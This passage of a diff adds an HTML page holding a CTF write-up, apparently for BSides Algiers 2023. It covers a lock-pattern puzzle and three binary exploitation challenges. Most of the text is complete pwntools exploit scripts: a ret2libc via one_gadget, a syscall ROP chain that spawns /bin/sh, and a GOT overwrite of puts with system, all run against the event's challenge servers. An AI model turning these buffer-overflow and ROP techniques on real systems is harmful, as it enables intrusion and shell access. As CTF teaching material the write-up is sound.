+</span><span>    xdata, ydata = line.</span><span style="color:#bf616a;">get_data</span><span>()
+</span><span>    xdata = np.</span><span style="color:#bf616a;">append</span><span>(xdata, x)
+</span><span>    ydata = np.</span><span style="color:#bf616a;">append</span><span>(ydata, y)
+</span><span>    line.</span><span style="color:#bf616a;">set_data</span><span>(xdata, ydata)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>point,
+</span><span>
+</span><span>ani = </span><span style="color:#bf616a;">FuncAnimation</span><span>(fig, update, </span><span style="color:#bf616a;">frames</span><span>=</span><span style="color:#96b5b4;">len</span><span>(coords), </span><span style="color:#bf616a;">interval</span><span>=</span><span style="color:#d08770;">1</span><span>, </span><span style="color:#bf616a;">blit</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span>plt.</span><span style="color:#bf616a;">show</span><span>()
+</span><span>
+</span></code></pre>
+<h3 id="flag-3">flag</h3>
+<p><img src="https://itskarudo.github.io/bsides-algiers-2023/./lock-pattern-sol.png" alt="Lock schema" /></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{457198632}
+</span></code></pre>
+<h2 id="unaligned">unaligned</h2>
+<h3 id="recon-3">recon</h3>
+<p>we're given an ELF binary <code>unaligned</code>, it gives you a libc leak (address of <code>system()</code>) and reads input overflowing the stack buffer, stack canary is disabled which means we can redirect code execution, classic <code>ret2libc</code>.</p>
+<h3 id="alignment">alignment</h3>
+<p>our overflow is only 24 bytes, at first glance this might seem enough for an exploit such as:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">40 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RDI</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">BIN_SH</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(system)
+</span></code></pre>
+<p>but this will fail due to stack alignment, since the stack is no longer 16-bytes aligned.</p>
+<p>the usual way we'd go about this is to prepend the ROP chain with a <code>ret</code> gadget, but since we don't have enough space for that we'll have to find another way.</p>
+<h3 id="libc-gadgets">libc gadgets</h3>
+<p>using <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> on the provided <code>glibc</code>, we can find the following gadget:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">0x4f2a5</span><span> execve(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, rsp+0x40, environ)
+</span><span style="color:#bf616a;">constraints:
+</span><span>  </span><span style="color:#bf616a;">rsp </span><span>&amp; </span><span style="color:#bf616a;">0xf</span><span> == 0
+</span><span>  </span><span style="color:#bf616a;">rcx</span><span> == NULL
+</span></code></pre>
+<p>the only requirement here is that <code>rcx == NULL</code> (since the first constraints is already satisfied), so we can just set <code>rcx</code> to <code>NULL</code> and jump to the gadget, and this will fit within our 24 bytes overflow</p>
+<h3 id="final-exploit-3">final exploit</h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.binary = elf = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./unaligned</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span style="color:#65737e;"># p = elf.process()
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">unaligned.bsides.shellmates.club</span><span>&quot;, </span><span style="color:#d08770;">443</span><span>, </span><span style="color:#bf616a;">ssl</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span style="color:#b48ead;">assert </span><span>p
+</span><span>
+</span><span>system = </span><span style="color:#bf616a;">int</span><span>(p.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">decode</span><span>().</span><span style="color:#bf616a;">split</span><span>(&#39; &#39;)[</span><span style="color:#d08770;">1</span><span>], </span><span style="color:#d08770;">16</span><span>)
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">system@</span><span>{</span><span style="color:#96b5b4;">hex</span><span>(system)}&quot;)
+</span><span>
+</span><span>libc.address = system - libc.symbols[&#39;</span><span style="color:#a3be8c;">system</span><span>&#39;]
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">libc@</span><span>{</span><span style="color:#96b5b4;">hex</span><span>(libc.address)}&quot;)
+</span><span>
+</span><span>r = </span><span style="color:#bf616a;">ROP</span><span>(libc)
+</span><span style="color:#bf616a;">POP_RCX </span><span>= r.</span><span style="color:#bf616a;">find_gadget</span><span>([&quot;</span><span style="color:#a3be8c;">pop rcx</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">ret</span><span>&quot;]).address
+</span><span style="color:#bf616a;">RET </span><span>= r.</span><span style="color:#bf616a;">find_gadget</span><span>([&quot;</span><span style="color:#a3be8c;">ret</span><span>&quot;]).address
+</span><span>
+</span><span>
+</span><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">40
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RCX</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(libc.address + </span><span style="color:#d08770;">0x4f2a5</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">Name:</span><span>&#39;, payload)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h3 id="flag-4">flag</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{SOrRY_fOR_f0RciBLy_Un$4tify1ng_0ne_g4DGet_CoN$tr41nT$}
+</span></code></pre>
+<h2 id="sys-rop">SYS_ROP</h2>
+<h3 id="recon-4">recon</h3>
+<p>we are given an ELF executable <code>chall</code> which has all mitigations disabled and is not linked against <code>libc</code>.</p>
+<p>when examining it we notice that we have a stack buffer overflow, meaning we can ROP (who would've guessed?).</p>
+<p>we can find the following gadgets:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">0x0000000000401085:</span><span> pop rax; </span><span style="color:#bf616a;">ret</span><span>;
+</span><span style="color:#bf616a;">0x000000000040107f:</span><span> pop rdi; </span><span style="color:#bf616a;">ret</span><span>;
+</span><span style="color:#bf616a;">0x0000000000401083:</span><span> pop rdx; </span><span style="color:#bf616a;">ret</span><span>;
+</span><span style="color:#bf616a;">0x0000000000401081:</span><span> pop rsi; </span><span style="color:#bf616a;">ret</span><span>;
+</span><span style="color:#bf616a;">0x000000000040100a:</span><span> syscall;
+</span></code></pre>
+<p>we can call arbitrary syscalls.</p>
+<h3 id="exploit-plan">exploit plan</h3>
+<p>since we don't have <code>libc</code>, we will have to call <code>execve(&quot;/bin/sh&quot;, {&quot;/bin/sh&quot;, NULL}, NULL)</code>.</p>
+<h3 id="final-exploit-4">final exploit</h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.binary = elf = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./chall</span><span>&quot;)
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">sys-rop.bsides.shellmates.club</span><span>&quot;, </span><span style="color:#d08770;">443</span><span>, </span><span style="color:#bf616a;">ssl</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span style="color:#b48ead;">assert </span><span>p
+</span><span>
+</span><span>rw = </span><span style="color:#d08770;">0x402010
+</span><span style="color:#bf616a;">POP_RAX </span><span>= </span><span style="color:#d08770;">0x401085
+</span><span style="color:#bf616a;">POP_RDI </span><span>= </span><span style="color:#d08770;">0x40107f
+</span><span style="color:#bf616a;">POP_RSI </span><span>= </span><span style="color:#d08770;">0x401081
+</span><span style="color:#bf616a;">POP_RDX </span><span>= </span><span style="color:#d08770;">0x401083
+</span><span style="color:#bf616a;">SYSCALL </span><span>= </span><span style="color:#d08770;">0x401011
+</span><span>
+</span><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">88
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RAX</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RDI</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RSI</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(rw)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RDX</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">32</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">SYSCALL</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RAX</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x3b</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RDI</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(rw)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RSI</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(rw+</span><span style="color:#d08770;">16</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">POP_RDX</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">SYSCALL</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">message:</span><span>&#39;, payload)
+</span><span>
+</span><span>part2 = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\0</span><span>&#39;
+</span><span>part2 += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>part2 += </span><span style="color:#bf616a;">p64</span><span>(rw)
+</span><span>part2 += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(part2)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h3 id="flag-5">flag</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{yOu_4rE_a_true_H4CkeR}
+</span></code></pre>
+<h2 id="junior-pwner">junior pwner</h2>
+<p>I'm getting too lazy to write so here's the rough idea:</p>
+<ul>
+<li>you can overflow a stack buffer and override the saved <code>rbp</code></li>
+<li>use that overflow to override the <code>messages</code> array and use it to leak a <code>libc</code> address</li>
+<li>use the overflow again to write <code>/bin/sh</code> to the <code>messages</code> array</li>
+<li>override the <code>puts@GOT</code> entry with the address of <code>system()</code></li>
+<li>now next time <code>puts</code> gets called we call <code>system()</code> instead, and since we overwritten all messages with <code>/bin/sh</code>, we guarantee that we pass <code>/bin/sh</code> as the first argument.</li>
+</ul>
+<h3 id="final-exploit-5">final exploit</h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.binary = elf = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./chall</span><span>&quot;)
+</span><span>
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>
+</span><span style="color:#65737e;"># p = elf.process()
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">junior-pwner.bsides.shellmates.club</span><span>&quot;, </span><span style="color:#d08770;">443</span><span>, </span><span style="color:#bf616a;">ssl</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span style="color:#b48ead;">assert </span><span>p
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>pay1 = </span><span style="color:#bf616a;">p64</span><span>(elf.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])*</span><span style="color:#d08770;">3
+</span><span>pay1 += </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*(</span><span style="color:#d08770;">64</span><span>-</span><span style="color:#96b5b4;">len</span><span>(pay1))
+</span><span>pay1 += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4041c0 </span><span>+ </span><span style="color:#d08770;">0x50</span><span>)
+</span><span>gdb.</span><span style="color:#bf616a;">attach</span><span>(p)
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(pay1)
+</span><span>n = </span><span style="color:#bf616a;">u64</span><span>(p.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\0</span><span>&#39;))
+</span><span>
+</span><span>libc.address = n - libc.symbols[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;]
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">libc@</span><span>{</span><span style="color:#96b5b4;">hex</span><span>(libc.address)}&quot;)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span style="color:#bf616a;">BINSH </span><span>= </span><span style="color:#96b5b4;">next</span><span>(libc.</span><span style="color:#bf616a;">search</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\0</span><span>&#39;))
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">/bin/sh @ </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#bf616a;">BINSH</span><span>)}&quot;)
+</span><span>pay2 = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">BINSH</span><span>)*</span><span style="color:#d08770;">3
+</span><span>pay2 += </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*(</span><span style="color:#d08770;">64</span><span>-</span><span style="color:#96b5b4;">len</span><span>(pay2))
+</span><span>pay2 += </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4041c0 </span><span>+ </span><span style="color:#d08770;">0x50</span><span>)
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(pay2)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>
+</span><span>pay3 = </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">system</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">setbuf</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">read</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">srand</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">memcpy</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">time</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">malloc</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(libc.symbols[&#39;</span><span style="color:#a3be8c;">rand</span><span>&#39;])
+</span><span>pay3 += </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*(</span><span style="color:#d08770;">64</span><span>-</span><span style="color:#96b5b4;">len</span><span>(pay3))
+</span><span>pay3 += </span><span style="color:#bf616a;">p64</span><span>(elf.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;] + </span><span style="color:#d08770;">0x50</span><span>)
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(pay3)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h3 id="flag-6">flag</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{Never_trUst_aSlR_eV3N_jUn1Or$_C0ULd_BRE4K_It!}
+</span></code></pre>
+
+
+            </main>
+            <footer>
+                
+<p class="taxonomies">
+
+</p>
+
+                
+            </footer>
+        </article>
+    </body>
+</html>
+        
